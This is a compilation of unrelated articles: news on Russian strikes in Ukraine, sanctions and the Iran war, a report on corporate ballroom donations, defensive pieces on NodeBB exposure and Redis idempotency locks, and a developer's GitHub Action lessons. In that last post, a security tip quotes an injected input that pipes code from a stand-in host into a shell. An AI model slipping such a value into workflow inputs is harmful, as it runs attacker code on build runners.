In the Zelenodolsk community of the Kryvyi Rih district, attacks damaged infrastructure, a logistics company branch and a private home.
In the Nikopol area, Russian forces targeted Nikopol, Marhanets and Pokrovske, damaging infrastructure, educational facilities, a sports complex, warehouses, a shopping center, apartment buildings and private vehicles.
Private homes were also damaged in the Sloviansk community of the Synelnykove district.
A daytime Russian attack on an enterprise in the Poltava community injured one person and damaged a building and three cars, according to the SES .
In the Sumy region, the SES ’s Phoenix evacuation unit used an armored vehicle to bring two women out of the border area of the Svesa community, which is under constant Russian shelling.
The attacks came as Russia responded to the latest effort by US President Donald Trump to enforce a ceasefire by launching fresh waves of attacks on Ukraine’s energy grid, residential buildings and other critical infrastructure.
Trump also struck a diesel deal with Russian President Vladimir Putin, just three weeks after he signed the Lindsey O. Graham Sanctioning Russia and Iran Act bill into law on Sept. 18.
According to Zelensky, Russian forces carried out several ballistic missile barrages in recent days while Shahed attack drones remained in Ukrainian airspace almost continuously, with close to 1,000 drones launched since the start of Wednesday, Oct. 14.
The strikes came without prior allied warning and amid tweaked Starshield parameters that limited terminals above 160 kilometers per hour (roughly 100 miles per hour), disrupting Kyiv’s drone operations.
Kyiv Post is Ukraine’s first and oldest English news organization, reporting since 1995. Its international reach – 90% of readers are outside of Ukraine – make it truly Ukraine’s global voice.

title: Nvidia and Cisco confirm multimillion-dollar donations to Trump's White House ballroom
body:
Technology giants Nvidia and Cisco have committed millions to President Donald Trump 's White House ballroom renovation project, CNBC confirmed on Thursday.
Nvidia and Apple each pledged $25 million to the project, according to a report from The Washington Post . Those were among the largest donations on the list, which totaled more than $330 million.
"As an American company, our support for the United States is paramount, and independent of any business interests," an Nvidia spokesperson told CNBC. "We were proud to be able to make a donation to a nonpartisan trust that serves all Americans and have said so publicly since the donation was made."
Amazon , Palantir , ServiceNow , Meta Platforms and Microsoft also made contributions in the millions, according to the Post. Microsoft and Meta declined to comment on the report. Cisco and ServiceNow confirmed their $5 million donation.
"ServiceNow's business with the U.S. government is separate and unconnected to any donations we make to any cause," the company said in a statement to CNBC. "Any attempt to connect the two processes is wholly inaccurate."
Amazon, Apple, HP Inc. , Micron , Palantir, Salesforce and Vast Space, which were all listed as major donors in the report, did not immediately respond to a request for comment.
The Post reported that the ballroom donations were sent through a nonprofit trust, and donors received a pledge form for donating to the "Donald J. Trump Ballroom."
Lawmakers and experts have repeatedly called out donations to the project, requesting information on the private donors. Some have also raised concerns over the potential influence these commitments could have on policy decisions or any federal contract awards.
Tech leaders have largely favored Trump's pro-business, light-touch approach to antitrust and regulation, and some companies have secured hundreds of millions in contracts through artificial intelligence infrastructure and defense deals during his second term.
Tech leaders like Meta CEO Mark Zuckerberg and Nvidia CEO Jensen Huang have been regulars at state dinners and meetings in Washington, and were central figures at the White House AI luncheon on Sept. 29.
The documents obtained by the Post showed 67 contributions above $10,000 as of late September.

title: I published my first GitHub Action. Five things I'd tell myself first
body:
This week I published my first GitHub Action to the Marketplace. It's a small one: a composite action that runs a CLI I maintain, pinned to an exact version, on every push. Small as it is, it taught me five things I wish I'd known before I started. None of them are specific to my tool, so here they are. 1. A composite action is probably enough There are three kinds of actions: JavaScript, Docker and composite. I almost reached for JavaScript because that's what most popular actions use. But my action only needed to run one command: runs : using : composite steps : - shell : bash run : npx --yes my-cli@0.5.0 --dry-run A composite action is just a list of steps, like a mini-workflow. No build step, no dist/ folder to commit, no container to pull. The cost is that it relies on what the runner already has. Mine needs Node, which GitHub-hosted runners include, so the README says plainly that self-hosted runners need Node installed. If your action is "run this tool with these flags", start with composite. 2. Never put ${{ inputs.x }} inside run: This was the one I didn't know, and it's the most important. ${{ }} expressions are expanded before the shell runs. The value gets pasted into your script as text. So if an input contains something like "; curl evil.example | sh; echo " , it becomes part of your script. That's script injection, and GitHub's own security hardening guide for Actions warns about it. What I almost wrote: - shell : bash run : npx --yes my-cli@0.5.0 --dir ${{ inputs.working-directory }} What I shipped: - shell : bash env : INPUT_DIR : ${{ inputs.working-directory }} run : npx --yes my-cli@0.5.0 --dir "$INPUT_DIR" The expression now only sets an environment variable. Bash reads the variable as data, and the quotes keep it as a single argument. Every input in my action goes through env: and is quoted, and there is no ${{ }} anywhere inside a run: block. 3. Secrets go in env: , not on the command line My CLI takes an API token. The obvious way is --token "$TOKEN" . The problem: command-line arguments are visible to anything on the machine that can list processes, and they show up in logs the moment someone turns on set -x or debug logging. GitHub masks registered secrets in logs, but I'd rather not depend on masking. So the CLI reads the token from an environment variable when --token isn't given, and the action only ever passes it that way: - shell : bash env : MY_CLI_TOKEN : ${{ inputs.token }} run : npx --yes my-cli@0.5.0 Funny thing: a few days after shipping the action, a security pass found that the copy-paste workflow snippet on my own app's settings page still passed --token on the command line. Fixed the same day. 4. Pin two different things, two different ways There are two versions in play, and they behave differently. The tool inside the action. I pin the npm package to an exact version ( my-cli@0.5.0 ), because a published npm version can't change. Whatever a user's workflow runs today, it runs tomorrow. The action itself. Users write uses: owner/my-action@v1 . But v1 is just a git tag, and tags can be moved. That's the whole point of a major-version tag: I move v1 forward when I release v1.0.1 . It's convenient, and it also means users are trusting me not to move it somewhere bad. So the README says: if you want a guarantee, pin the full commit SHA instead: - uses : owner/my-action@
# v1.0.0 Creating the moving tag after the first release is two commands: git tag v1 v1.0.0 git push origin v1 When v1.0.1 ships, you move it with git tag -f v1 v1.0.1 and git push -f origin v1 . 5. Test the action in its own repo, including the failure path The repo has a workflow that runs the action on every push against a tiny fixture: one JS file that reads an env var, and a .env.example that doesn't declare it. The action runs in dry-run mode, so it needs no secret. The part I'm happiest with is testing the failure. Without a token and without dry-run, the action must fail with a clear message. A step that must fail looks like this: - name : Run without a token (must fail) id : no_token continue-on-error : true uses : ./ with : working-directory : test/fixture - name : Check that it failed if : steps.no_token.outcome != 'failure' run : | echo "The action should fail without a token" exit 1 continue-on-error lets the workflow keep going, and outcome still records what really happened. If someone later "fixes" the action so it silently succeeds without a token, this goes red. Bonus: Marketplace gotchas The name must be unique. Not just among actions: it can't match a Marketplace category, or a GitHub user or organization you don't own. Search the Marketplace first. Fill in the release title. I left it empty, and my first release showed up as "v1.0.0: Merge pull request #1 from …". Don't write @v1 in release notes. GitHub turned it into an @-mention of a real user called v1 , who then appeared as a contributor to my release. Put it in backticks. Wrapping up None of this is hard, but #2 and #3 are easy to get wrong, and they're the kind of mistake that only matters once someone exploits it. If you maintain an action, it's worth a two-minute look at your run: blocks. The action I built is open source if you want to see all of this in one place: Utsav-mishra-25/deployhealth-action . Do you pin third-party actions by SHA, or do you trust tags? I'm curious where people draw the line.

title: US extends sanctions waiver on Russia's Lukoil until 2027
body: The US on Thursday extended a sanctions waiver on Russian oil giant Lukoil , allowing its service operations outside the country to continue until April 2027, the Treasury Department announced. Under the new general licence, Lukoil petrol stations will be able to serve customers until April 25, 2027. This includes petrol stations in the US, the department said. The waiver replaces a previous licence that was set to expire this month. The licence prohibits the “transfer of funds to any person or account located in the Russian Federation”, it reads. It also excludes transactions involving Russia 's central bank, its national wealth fund and the Ministry of Finance. In a separate licence, the Treasury Department also authorised certain transactions for Lukoil Bulgaria's firms in the same time period. The decision comes a week after US President Donald Trump said he had reached a deal with Russian President Vladimir Putin that would allow Russia to supply diesel to the US and the global markets. The agreement deepened a rift between the US and its European partners, including Ukraine, and within Mr Trump's Republican Party. Mr Trump said Russia would immediately release 300,000 tonnes of diesel to the US and global markets, with another 500,000 tonnes released in November and a million tonnes “immediately thereafter”. He also said Russia would release three million tonnes of fuel “within a short period of time” depending on the condition of the country's diesel refineries. Oil prices remain high during the seven-month Iran war, as tanker traffic through the Strait of Hormuz is significantly well below its prewar levels and as Iranian attacks continue in the waterway. Futures for Brent global benchmark crude fell 0.27 per cent to settle at $105.8 a barrel on Thursday, with West Texas Intermediate futures gaining 2.76 per cent at $97.71 a barrel. Diesel prices also remained elevated at $6.31 a gallon, compared to the average of $3.65 a gallon at the same time last year. The International Energy Agency's governing board on Thursday said it would quicken the release of more than 20 million barrels of diesel and the remaining volumes of the 400 million barrels of emergency stocks of crude and other oil products previously agreed to in March. The IEA said on Wednesday it expects oil market balances to remain in a deficit well into 2027. “As the remaining buffers in the system continue to erode, in the absence of a resolution to the conflicts in the Middle East, oil markets may experience more turmoil in the months ahead before any eventual surplus emerges in 2027,” it said.

title: Ukraine’s military now orders supplies based on real front-line data, not guesswork, lawmaker says. Shift comes under new commander-in-chief
body: (function(w,q){w[q]=w[q]||[];w[q].push(["_mgc.load"])})(window,"_mgq"); New Ukrainian Commander-in-Chief Mykhailo Drapatyi is moving away from his predecessor’s legacy on several fronts, making the army more human-centric and tying procurement to its real needs, lawmaker Yehor Cherniev of the Parliamentary Defense Committee says , per NV. Drapatyi took over as commander-in-chief on 21 July 2026, after protests over the sacking of Defense Minister Mykhailo Fedorov widened into demands for a military shake-up. His guiding principles, Cherniev says, differ sharply from those of his predecessor, Oleksandr Syrskyi. The change is spelled out in a document Drapatyi published, “Principles of Leadership of the Commander-in-Chief and the Development of the Force in Wartime,” which sets out his intent and priorities. Its core is human-centricity. “War demands resolve, but never recklessness. Every unjustified loss weakens the Armed Forces,” Drapatyi writes in the document, addressing commanders. A command philosophy built around the soldier The document sets out a single objective, eight priorities, 14 requirements for commanders and eight expectations of headquarters, with the protection of the country, its cities, villages and critical infrastructure at the top of the list. People, it says, are the most valuable combat capability. Commanders and staff are required to give honest assessments and not let optimism, fear or personal ambition distort reality while preparing soldiers for combat, reducing unjustified risk, caring for the wounded, honoring the fallen and supporting their families. Support does not end when service does: those who defended Ukraine must get proper rehabilitation, recognition and opportunities, the document says. Buying what the front actually needs The second shift Cherniev flags is in procurement. Under Drapatyi, the General Staff began shaping the army’s purchasing needs anew, adapting them to approaches introduced at the Defense Ministry under Fedorov, so orders follow real front-line demand rather than guesswork. “The General Staff now works from real data, not just pointing a finger at the sky, but this product is needed in this quantity. That makes procurement fairly transparent and clear,” Cherniev says. He frames both changes, on people and on purchasing, as the most important Drapatyi has brought to the armed forces. Read also Romania finally holds Russia responsible for the drone attacks on ships off its coast, and wants a joint NATO command for the Black Sea EU fast-tracks merger of three European firms into one SpaceX rival. It wants to end reliance on US satellites that failed Ukraine this week White House ordered limits on Ukraine’s military satellite service — Reuters. Who made the decision remains unclear

title: NodeBB Deployments in ZoomEye Results: Fingerprint Noise and Real Exposure
body: NodeBB Deployments in ZoomEye Results: Fingerprint Noise and Real Exposure An application fingerprint and a page title describe the same fleet from two angles, and they rarely agree. For NodeBB the disagreement is wide. A query for "app=NodeBB" returned 114 results on 2026-10-07, while a query for "title=NodeBB" returned 1332. A defender should be more interested in that ratio than in either number alone. Why fingerprints miss A fingerprint depends on a response the operator did not remove. A reverse proxy that strips headers, a custom theme that changes the landing page, or a login wall that returns a generic page all hide the product from an automated probe. The service is still there and still reachable. It simply stops matching the pattern a search engine looks for. Why titles over-count A title match is a weaker signal than an application match. Any page that happens to carry the same word in its heading can match, including documentation, reviews, and unrelated sites. That is why a title count is a useful cross-check and a poor inventory. Use it to find hosts the application fingerprint missed, and verify each one before treating it as an instance you own. What a NodeBB operator should review NodeBB runs as a Node.js application, so it inherits the plugin ecosystem of that runtime. Every installed plugin is code with the privileges of the process, and plugins are the most common source of an unexpected route on the public interface. List the plugins, note who maintains each one, and check the last update date against the release notes. Administration and the public path The administrative interface should not share a network path with the public forum. Where that separation is impractical, put the administrative path behind an additional authentication layer and restrict it by source address. Check whether a default administrative account exists and whether it has been renamed. A forum with an administrator named for the product hands an attacker one half of a credential. Version disclosure as a maintenance signal Many installations advertise a version in a static asset or a generator tag. That disclosure is a maintenance signal rather than a vulnerability. Where the advertised version sits far behind the current release, the more important question is what else has not been updated. Compare the running version, the plugin versions, and the runtime version, and treat a wide spread as a sign the deployment has no owner. Reading 114 against 1332 Two readings fit those figures. Either most NodeBB installations are configured in a way that defeats the application probe, or the title probe matches pages that are not forums at all. Sample both queries and decide which explanation holds in your region and your sector. If the application probe finds almost nothing in your own ranges while the title probe finds many, your inventory process is the thing to examine. Practical checks Confirm which hosts in your ranges answer on the forum path. Check the plugin list against the release notes. Check whether the runtime is a supported release. Check whether the deployment exposes an administrative or setup route to the internet. Log each answer, because the value of this exercise comes from repeating it and comparing the results.

title: Distributed Idempotency Key Collisions: Clock Skew Mutex Leaks, Race Conditions, and Double-Execution Vulnerabilities
body: Wrapping API handlers with naive Redis key locks ( SET key val NX EX 30 ) to enforce idempotency creates an illusion of safety. Under concurrent traffic bursts, worker stalls, network partitions, and non-atomic status releases can cause duplicate executions: charging credit cards twice or creating duplicate database records. Here is an architectural deep dive into diagnosing distributed idempotency lock breaches and engineering atomic state transition engines. In mission-critical B2B SaaS platforms, especially those handling payment processing, billing generation, or external state provisioning, enforcing strict exactly-once execution via idempotency keys is a core architectural requirement. However, naive Redis lock implementations often contain subtle, high-concurrency race conditions that silently break under network partitions, worker thread stalls, and distributed clock skew. 1. The Fallacy of Naive Redis Mutex Locks A standard anti-pattern in Node.js and Go microservices is using a simple Redis string set operation to acquire an execution lock prior to invoking business logic: // NAÏVE ANTI-PATTERN: Vulnerable Idempotency Lock async function handlePaymentNaive ( req : Request , res : Response ) { const idempotencyKey = req . headers [ ' idempotency-key ' ]; const lockKey = `idempotency: ${ idempotencyKey } ` ; // Attempt to acquire execution lock for 10 seconds const acquired = await redis . set ( lockKey , ' LOCKED ' , ' NX ' , ' EX ' , 10 ); if ( ! acquired ) { return res . status ( 409 ). json ({ error : ' Concurrent request in progress ' }); } // Execute heavy business logic (e.g., Stripe API call + DB mutation) const result = await processPayment ( req . body ); // Cache response for future retries await redis . set ( `response: ${ idempotencyKey } ` , JSON . stringify ( result ), ' EX ' , 86400 ); return res . json ( result ); } Three Silent Failure Vectors The Worker Stall / GC Pause Breach: If a Garbage Collection (GC) pause, unhandled event loop block, or downstream Stripe API latency keeps the worker busy for longer than 10 seconds, the Redis TTL expires automatically. Redis deletes the lock while the first request is still executing. A concurrent retry attempt instantly acquires the lock and executes the payment a second time. The Non-Atomic Release Bug: If a worker finishes execution and calls redis.del(lockKey) or overwrites the key without verifying ownership, it might delete or clobber a lock that was newly acquired by a second worker after the first worker's lock expired, unlocking the door for a third incoming request. Clock Skew & Failover Split-Brain: With a single Redis primary, TTLs run on the Redis server's own clock, so application-server skew does not shorten them. Problems appear in distributed setups: multi-master schemes like Redlock depend on bounded clock drift across independent Redis nodes, and Redis replication is asynchronous, so a lock written to a primary can vanish during failover. In both cases, two workers can believe they hold the same lock simultaneously. 2. Architectural Pattern: Atomic Two-Phase State Engine To close these race conditions, replace primitive boolean lock flags with a 3-state state engine backed by atomic Lua scripts inside Redis. Every state change, both acquiring the key and finalizing it, happens in a single atomic script that checks who owns the key. State Machine States PROCESSING : A request is actively executing. Contains a unique, randomly generated worker UUID (the owner) and an acquisition timestamp. COMPLETED : The request finished successfully. Holds the serialized HTTP response status and body payload for replay. RELEASED (key deleted): The operation failed with a retryable error. The owning worker deletes the key so the client can retry cleanly. Phase 1: Atomic Acquisition via Redis Lua Scripting -- ACQUIRE_LUA_SCRIPT: Atomic Idempotency Lock Acquisition local lockKey = KEYS [ 1 ] local workerUuid = ARGV [ 1 ] local lockTtlSeconds = tonumber ( ARGV [ 2 ]) local existingState = redis . call ( 'GET' , lockKey ) if not existingState then -- Key does not exist: create PROCESSING state with owner UUID local payload = cjson . encode ({ status = "PROCESSING" , owner = workerUuid , created_at = ARGV [ 3 ] }) redis . call ( 'SET' , lockKey , payload , 'EX' , lockTtlSeconds ) return { "ACQUIRED" , payload } else -- Key exists: return current state payload to application return { "LOCKED" , existingState } end Phase 2: Ownership-Checked Finalization Completing or releasing the key must be just as atomic. This script only lets the worker that still owns the PROCESSING lock write the final state. A stale worker whose lock already expired gets 0 back and leaves the key untouched. -- FINALIZE_LUA_SCRIPT: Only the current owner may complete or release local lockKey = KEYS [ 1 ] local workerUuid = ARGV [ 1 ] local action = ARGV [ 2 ] -- "COMPLETE" or "RELEASE" local current = redis . call ( 'GET' , lockKey ) if not current then return 0 end local state = cjson . decode ( current ) if state . status ~= 'PROCESSING' or state . owner ~= workerUuid then return 0 -- Lock expired and was taken over: do not touch it end if action == 'COMPLETE' then redis . call ( 'SET' , lockKey , ARGV [ 3 ], 'EX' , tonumber ( ARGV [ 4 ])) else redis . call ( 'DEL' , lockKey ) end return 1 3. Production-Ready TypeScript Middleware Implementation The application layer acquires the key before running the handler, replays cached responses for completed keys, and finalizes through the ownership-checked script, never with a blind SET or DEL . // PRODUCTION-GRADE IDEMPOTENCY ENGINE (TypeScript) import { Request , Response , NextFunction } from ' express ' ; import { v4 as uuidv4 } from ' uuid ' ; import { Redis } from ' ioredis ' ; // ACQUIRE_LUA_SCRIPT and FINALIZE_LUA_SCRIPT hold the two Lua scripts above export function createIdempotencyMiddleware ( redis : Redis ) { return async ( req : Request , res : Response , next : NextFunction ) => { const idempotencyKey = req . headers [ ' idempotency-key ' ] as string ; if ( ! idempotencyKey ) return next (); const tenantId = req . user ?. tenantId || ' global ' ; const lockKey = `idempotency: ${ tenantId } : ${ idempotencyKey } ` ; const workerUuid = uuidv4 (); const lockTtl = 30 ; // 30 second execution ceiling // 1. Execute Atomic Lua Acquisition Script const [ action , rawData ] = await redis . eval ( ACQUIRE_LUA_SCRIPT , 1 , lockKey , workerUuid , lockTtl , Date . now (). toString () ) as [ string , string ]; if ( action === ' LOCKED ' ) { const state = JSON . parse ( rawData ); if ( state . status === ' PROCESSING ' ) { // Request is actively being processed by another worker return res . status ( 409 ). json ({ error : ' CONCURRENT_REQUEST ' , message : ' An identical request with this Idempotency-Key is currently executing. ' }); } if ( state . status === ' COMPLETED ' ) { // Replay identical response directly from cache res . setHeader ( ' X-Cache-Lookup ' , ' HIT-IDEMPOTENT ' ); return res . status ( state . statusCode ). json ( state . body ); } } // 2. Intercept the response and finalize ONLY if this worker still owns the lock const originalJson = res . json . bind ( res ); res . json = ( body : any ) => { const succeeded = res . statusCode >= 200 && res . statusCode < 300 ; const completedPayload = JSON . stringify ({ status : ' COMPLETED ' , statusCode : res . statusCode , body }); redis . eval ( FINALIZE_LUA_SCRIPT , 1 , lockKey , workerUuid , succeeded ? ' COMPLETE ' : ' RELEASE ' , completedPayload , 86400 // 24-hour replay retention ) . then (( owned ) => { if ( owned === 0 ) { // Our lock expired mid-request and another worker took over. // Redis state is protected; the DB constraint below must catch any duplicate side effect. console . warn ( ' [IDEMPOTENCY] Lock lost before completion: ' , lockKey ); } }) . catch (( err ) => console . error ( ' [IDEMPOTENCY] Finalize failed: ' , err )); return originalJson ( body ); }; next (); }; } This sketch hooks res.json . If your handlers also respond with res.send or res.end , wrap those the same way, or the key will sit in PROCESSING until its TTL expires. 4. Secondary Guardrail: Database-Level Unique Constraints The ownership check stops a stale worker from corrupting Redis state, but it cannot undo work that worker already did. If a lock expires mid-request, two workers can still both reach the payment step. Redis should act as your fast, first-line filter. For financial mutations, never rely on Redis alone . Always back distributed application locks with strict relational database constraints at the storage engine level. -- Database-Level Fail-Safe: Unique Idempotency Key Index CREATE TABLE payment_transactions ( id UUID PRIMARY KEY DEFAULT gen_random_uuid (), tenant_id UUID NOT NULL , idempotency_key VARCHAR ( 255 ) NOT NULL , amount_cents BIGINT NOT NULL , created_at TIMESTAMPTZ NOT NULL DEFAULT CLOCK_TIMESTAMP (), -- Absolute DB Guardrail against double execution CONSTRAINT unique_tenant_idempotency UNIQUE ( tenant_id , idempotency_key ) ); Insert this row before calling the payment provider, so the reservation happens first. If a Redis lock expires under an extreme 30-second stall, the database will reject the second worker's duplicate insert with a 23505 unique_violation error before any money moves. For the external call itself, pass the same idempotency key to the provider (Stripe, for example, accepts an Idempotency-Key header), so even a duplicate API request is charged only once. 5. Executive Summary & Systems Rules Never Use Plain SET NX EX for Idempotency: Always store a structured state payload containing a unique worker UUID to verify lock ownership. Never Release Un-Owned Locks: Use Lua scripts to ensure a worker completes or deletes a lock key ONLY if its worker UUID matches the key payload. Enforce Storage-Layer Unique Constraints: Always back Redis idempotency checks with unique compound indexes (e.g., (tenant_id, idempotency_key) ) inside PostgreSQL or MySQL, and forward the key to external payment providers. Worried about double charges or duplicate records in your payment flows? title: Over 200 troops have been awarded Purple Hearts during the Iran war
body: American service members have been awarded 202 Purple Hearts in the Iran war so far, officials told Task & Purpose, the vast majority to soldiers in the Army or National Guard. Purple Hearts are awarded to U.S. service members from all branches who are wounded or killed in support of U.S. combat operations . As of early October, 184 soldiers, 16 airmen, one Marine, and one sailor have received Purple Hearts. Eleven of the Purple Hearts, an Army official said, were posthumously awarded to soldiers killed in action. As of Oct. 13, the Pentagon counts 21 service members killed in action during the conflict or who died while deployed in support of those operations. The number of Purple Hearts awarded to date, which the military has not previously disclosed, is about one-quarter of the total number of troops that Pentagon officials say have been wounded or killed in combat with Iran. According to the Defense Department’s official casualty database , 865 troops have been wounded or died in the Iran war, which the Pentagon divides into Operation Epic Fury for combat prior to May 5 and refers to as Overseas Operations since. Army personnel have taken the brunt of the casualties since the war began, with 659 soldiers wounded as of Oct. 15. An Army official said 184 Purple Heart awards were awarded as of Oct. 8, but more are pending. Approval times for Purple Hearts can vary widely Service members often say that the Purple Heart is the most revered award in the military that no one wants to receive. But for those who are wounded in action, delays in approvals of a Purple Heart award are not uncommon. Like nearly all military decorations, the award has extensive rules that require paperwork and approvals. Some awards have been handed out years or even a decade after a service member was wounded . Many personnel who suffered traumatic brain injuries in previous conflicts only became eligible for the award with recent recognition of the condition as a wound of war . The VA estimates that more than 1.9 million Purple Hearts have been awarded to U.S. service members, but officials note there is no official tally of the total number of recipients. Veterans with a Purple Heart are often eligible for greater access to certain benefits from the Department of Veterans Affairs, like higher-priority health care services, reduced co-payments, disability claim compensation, school tuition coverage, and home loan fees. Awardees can also get higher preferences for federal jobs . According to the Army site on award criteria, “enemy-related injuries” that would qualify for a Purple Heart include wounds from bullets, shrapnel, mines, vehicle or aircraft accidents, concussions or TBIs resulting in a loss of consciousness or duty restriction for more than 48 hours from explosions. Wounds that likely are not eligible include those from environmental factors like frostbite or heat stroke, hearing loss, and post-traumatic stress disorders. According to the rules that govern the award, a service member who suffers multiple wounds or injuries in a single incident is only eligible for one Purple Heart. For any subsequent events and injuries that are Purple Heart-eligible, troops receive an Oak Leaf Cluster that is worn on the medal or ribbon. “When contemplating an award of this decoration, the key issue that commanders must take into consideration is the degree to which the enemy caused the injury. The fact that the proposed recipient was participating in direct or indirect combat operations is a necessary prerequisite, but is not sole justification for award,” according to an Army page on award eligibility . As the Iran war has dragged on, media reports and members of Congress have scrutinized the information and lack of context around numbers in the Pentagon’s casualty database.
